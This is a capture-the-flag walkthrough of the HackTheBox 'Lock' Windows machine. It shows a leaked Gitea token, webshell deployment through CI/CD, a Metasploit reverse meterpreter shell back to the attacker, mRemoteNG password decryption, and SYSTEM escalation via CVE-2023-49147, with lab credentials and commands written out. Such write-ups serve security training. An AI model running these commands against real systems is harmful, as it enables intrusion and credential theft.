# [HackTheBox - Lock](https://app.hackthebox.com/machines/Lock)
![73d89b3fdd96703dbfe2f36b028651b0.png](/resources/73d89b3fdd96703dbfe2f36b028651b0.png)
## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Initial Access with Webshell deployment via Gitea](#initial-access-with-webshell-deployment-via-gitea)
- [RDP as gale.dekarios from mRemoteNG configuration file](#rdp-as-galedekarios-from-mremoteng-configuration-file)
- [Privilege Escalation to SYSTEM with CVE-2023-49147 (PDF24 Creator)](#privilege-escalation-to-system-with-cve-2023-49147-pdf24-creator)

***
## Abstract
Lock is a vulnlab machine imported to HackTheBox as a Easy Windows box. I started with network enumeration with nmap, revealing this machine is Windows Server that running Gitea, website on port 80, RDP and SMB. 

On the enumeration phase, I discovered Gitea personal access token (PAT) from commit history of exposed repository which I use it with the script in that repository to discover the website repository which responsible for deploying the website.

After discover that CI/CD integration is active, I deployed an aspx webshell and get foothold as "ellen.freeman".

I discovered mRemoteNG configuration file that contain credential of  "gale.dekarios" user on the documents folder of "ellen.freeman" which after decrypting it, I can access to the box again with RDP.

Lastly, I exploited CVE-2023-49147 of PDF24 Creator by creating an oplock to the log file that will be accessed by SYSTEM process during reparing process, I opened a new web browser as SYSTEM which then spawned command prompt from it later to root the box.

## Enumeration
I start with nmap scan without any flag to quickly scan for well-known port which reveals that this machine are running port 80 for website, 445 for SMB, 3389 for RDP and unknown service on port 3000.

![d5cf383622da5a9a8d8b8fba8e9be07d.png](/resources/d5cf383622da5a9a8d8b8fba8e9be07d.png)

I rerun nmap scan again but with `-sCV` for service enumeration and nmap script engine which I discover Gitea running on port 3000 and the website on port 80 is running with IIS.

![751b383b82f1e6c74fa9d0855495760d.png](/resources/751b383b82f1e6c74fa9d0855495760d.png)

I try to use null session and guest account to see if I can connect to any share with any of these but both are not usable here.

![2a7164465b15147457795ec4967d7c02.png](/resources/2a7164465b15147457795ec4967d7c02.png)

I start enumerate the website but nothing too interesting here, the tech stack is very common but at least I know that the machine is Windows Server.

![a01a069bfcb427f2acd1e8c6b8d12bcb.png](/resources/a01a069bfcb427f2acd1e8c6b8d12bcb.png)

Now it is the time for me to look at Gitea.

![078f714ccaab279fe3dc91eaed20d7d3.png](/resources/078f714ccaab279fe3dc91eaed20d7d3.png)

I found the Gitea version from the buttom on website but I did not find any interesting CVE that could be used for initial access for me.  

![41fc2329ae468184b566b521b9da551a.png](/resources/41fc2329ae468184b566b521b9da551a.png)

I discover "dev-scripts" repository exposing on Gitea which own by "ellen.freeman" user so I'll take a look at it.

![0b977b608331f4d18822d8b56008515a.png](/resources/0b977b608331f4d18822d8b56008515a.png)

There is a `repos.py` script on this project and it can be used fetch the repository using Gitea PAT (Personal Acces Token) and the domain that host it so there is a chance that the first version of this script could leak PAT that I could take advantage of.

>A Gitea Personal Access Token (PAT) is an authentication token used to grant programmatic access to your Gitea account without needing to provide your username and password directly. This is particularly useful for automation, integrations with other tools (like CI/CD pipelines, IDEs, or other applications), and when you need to grant limited, revocable access.

![69f2bb0dc65480113c41e94d86a9ead7.png](/resources/69f2bb0dc65480113c41e94d86a9ead7.png)

I check the git commit history which I found that there is 1 commit before the current one that I could check.

![bdba7bade4ba09ea4e403286c4c98838.png](/resources/bdba7bade4ba09ea4e403286c4c98838.png)

And as expected,There is hard-coded PAT in the intial version of this script.

![818004036d9ad5b26f0d1dd9b0f91aad.png](/resources/818004036d9ad5b26f0d1dd9b0f91aad.png)

Now I will clone the repo to my machine and with GITEA PAT, I use the script to list more repositories hosting on server I found the "website" repository could be the one repository that used to deploy website on port 80.

```
git clone http://10.129.168.165:3000/ellen.freeman/dev-scripts.git
cd dev-scripts
export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f
python repos.py http://10.129.168.165:3000/
```
![e411d9c7f4693c667ed51515e97aa5d5.png](/resources/e411d9c7f4693c667ed51515e97aa5d5.png)

I clone the website repository and found couple of files that really confirm that this repository is responsible for website hosting on port 80.
```
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.168.165:3000/ellen.freeman/website.git
```
![37c679aa7f2dda8b61876163ec35e6d8.png](/resources/37c679aa7f2dda8b61876163ec35e6d8.png)

The content of `README.md` file reveals that CI/CD integration is active and anything I put here will be deployed on the webserver. which mean I can use this to deploy my webshell and get a foothold

![72c248c15bd7a7ba17c22c61d76afad9.png](/resources/72c248c15bd7a7ba17c22c61d76afad9.png)

## Initial Access with Webshell deployment via Gitea

I'll use the an aspx webshell already shipped in Kali Linux to deploy and push the commit to the repository hosting on the webserver to deploy. 

```
cp /usr/share/webshells/aspx/cmdasp.aspx .
git add cmdasp.aspx 
git config --global user.name "ellen.freeman"
git config --global user.email "ellen.freeman"
git commit -m "bug fix"
git push
```
![bd9038e0786124b5ac194ef03c2da233.png](/resources/bd9038e0786124b5ac194ef03c2da233.png)

Now I can access the webshell on my web browser.

![06251e2a120281fd44c12675e751741c.png](/resources/06251e2a120281fd44c12675e751741c.png)

I run `whoami /all` command to identify which user is running the website which reveals that "ellen.freeman"  is running this website and does not have much privilege that can be used for privilege escalation but I still need to get my foothold first before enumerate further.  

![4087760ef0a691426c7a2d1d660563c8.png](/resources/4087760ef0a691426c7a2d1d660563c8.png)

I'll use web_delivery module from metasploit framework to quickly generate powershell reverse shell payload (alternatively you can use revshells.com for this as well)  

```
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 443
run
```
![a034ee621d7e5d953cebdc7b7aa6a1fd.png](/resources/a034ee621d7e5d953cebdc7b7aa6a1fd.png)

After parsing the log in the webshell, I have fully interactive shell on the server as "ellen.freeman" and I still could not find the user flag yet so It might be in another user's folder.

![c9ae86e4d0d2b7bc01690ad6bf554620.png](/resources/c9ae86e4d0d2b7bc01690ad6bf554620.png)

## RDP as gale.dekarios from mRemoteNG configuration file 

After initial enumration, I found that beside "ellen.freeman", there is one more non-standard user on this server which is "gale.dekarios".

![b239582113f28e3fe24fb02ac27317b9.png](/resources/b239582113f28e3fe24fb02ac27317b9.png)

On the documents folder of "ellen.freeman", I found `config.xml` file which is a configuration file of mRemoteNG which contains encrypted password of "gale.dekarios" user.

![49ff04c56c8be1098c612262cd828974.png](/resources/49ff04c56c8be1098c612262cd828974.png)

I will download this configuration file to decrypt it with [mRemoteNG_password_decrypt](https://github.com/gquere/mRemoteNG_password_decrypt.git) script.

![02206f37bb7c1b7ecf67e40e9921b76f.png](/resources/02206f37bb7c1b7ecf67e40e9921b76f.png)

After executing the script, I finally get the password of  "gale.dekarios" user as seen in the image below.

```
python mremoteng_decrypt.py config.xml
```
![1e743a7643e165ed2dad2eada47d3962.png](/resources/1e743a7643e165ed2dad2eada47d3962.png)

I use netexec to confirm that if I can really use this credential to access to the server via RDP and the result says that I can with the letter "Pwn3d!"

```
nxc rdp 10.129.168.165 -u Gale.Dekarios -p ty8wnW9qCKDosXo6
```
![b97f4f7ace6eadc1eed7890e9c70f6c4.png](/resources/b97f4f7ace6eadc1eed7890e9c70f6c4.png)

I use xfreerdp to access to server as  "gale.dekarios" user and now I can see user flag on the desktop and also with mRemoteNG and PDF24 icon which obvious hint for privilege escalation path.

```
xfreerdp /u:Gale.Dekarios /p:'ty8wnW9qCKDosXo6' /v:10.129.168.165 /cert-ignore /dynamic-resolution +clipboard
```
![d89c531bdfe8e7506851e2cadc8ac5fb.png](/resources/d89c531bdfe8e7506851e2cadc8ac5fb.png)

## Privilege Escalation to SYSTEM with CVE-2023-49147 (PDF24 Creator) 

PDF24 caught my eye right away after gaining access via RDP so I will check the version of this software from its installation folder here.

![1dc92be7a4b11f5cbe1a1b599b36a201.png](/resources/1dc92be7a4b11f5cbe1a1b599b36a201.png)

Most software have the version embedded inside its executable property which I found that the PDF24 installed on this machine is version 11.15.

![a4fb9741d6bd01b96e545115c0bc3ae8.png](/resources/a4fb9741d6bd01b96e545115c0bc3ae8.png)

I quick google search reveal that in this version, it is vulnerable to [CVE-2023-49147](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/) which explain that during the repair process of PDF24 msi file, a subprocess get calls as SYSTEM to write log file and if I can block that file with oplock then the cmd process with SYSTEM privilege will hang which I can spawn another cmd as SYSTEM from it

![4c67f510d5773df91e2c34294ef7047a.png](/resources/4c67f510d5773df91e2c34294ef7047a.png)

And inside the `_admin` folder located on the root of C drive, I have PDF24 installer file so I won't need to download it from the internet to attempt this exploit this.

![84d58f54fa4cac77c9d798b64c5e1992.png](/resources/84d58f54fa4cac77c9d798b64c5e1992.png)

First, I'll transfer `SetOpLocks.exe` from [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools) repository.

![354690cb9751e329f872a39acbb5e345.png](/resources/354690cb9751e329f872a39acbb5e345.png)

Since I use Microsoft Edge inside Server to download it then SmartScreen gonna block it which I'll need to keep this file manually like this.

![010dd5624cb1b0dc75451d4b4805b002.png](/resources/010dd5624cb1b0dc75451d4b4805b002.png)

With the file ready, I create an oplock from the log file that will be used by repairing process. (and i guess this is why this box is called "Lock")

>An oplock (opportunistic lock) is a mechanism in Windows that lets a client request exclusive asynchronous notification/control over a file. If you successfully set an oplock on a file and another process tries to access it, the accessing process may block or get notified.

```
SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```
![1be65f3040ead6237909f05cfbf87215.png](/resources/1be65f3040ead6237909f05cfbf87215.png)

With the oplock ready, I will initial the repairing process with MSI file and let it run until it get stuck.

```
msiexec /fa pdf24-creator-11.15.1-x64.msi
```
![f794b2de11b6dd00cdaa842cba1a9227.png](/resources/f794b2de11b6dd00cdaa842cba1a9227.png)

After a while, I finally have a command prompt (repairing process) hanging which I right-click at the command prompt to open its propety and try to open a new web browser with it. from the PoC it clearly says that 

>Note: This attack does not work using a recent version of the Edge Browser or Internet Explorer. A different browser, such as Chrome or Firefox, needs to be used. Also make sure, that Edge or IE  have not been set to the default browser.

So I choose Firefox without a doubt to avoid any issue.

![a63c44910dee5dec35e74c4017333772.png](/resources/a63c44910dee5dec35e74c4017333772.png)

After I get firefox running as SYSTEM, I press Ctrl + O to use open file feature which I can run `cmd` from file explorer windows that was pop-up like this.

![7c22c32f38da0d2d9589b9ea03cc094a.png](/resources/7c22c32f38da0d2d9589b9ea03cc094a.png)

Now I have a SYSTEM shell.

![5ef12df8db1b9d38a84fab8448e94d29.png](/resources/5ef12df8db1b9d38a84fab8448e94d29.png)

Root flag is located on the desktop of administrator user and now i successfully root the box :D

![3813e31a5435b572267032a535e3686a.png](/resources/3813e31a5435b572267032a535e3686a.png)

![27a35ac3fa1a2115fa0b38e7467437aa.png](/resources/27a35ac3fa1a2115fa0b38e7467437aa.png)

https://labs.hackthebox.com/achievement/machine/1438364/699
***